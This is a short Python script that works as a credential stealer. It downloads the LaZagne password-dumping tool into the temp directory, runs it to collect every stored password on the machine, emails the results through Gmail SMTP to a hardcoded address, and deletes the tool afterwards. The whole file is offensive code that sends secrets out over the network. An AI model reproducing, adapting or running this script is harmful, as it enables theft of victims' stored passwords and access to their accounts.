#!/usr/bin/python

import requests, subprocess, smtplib, os, tempfile
# os cross platform

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
# better than: subprocess.call([cd /opt/...])
download("[laZagne directory]")
command = "laZagne.exe all"
result = subprocess.check_output(command, shell=True)
send_mail("asdf@gmail.com", "pass", result)
os.remove("laZagne.exe")
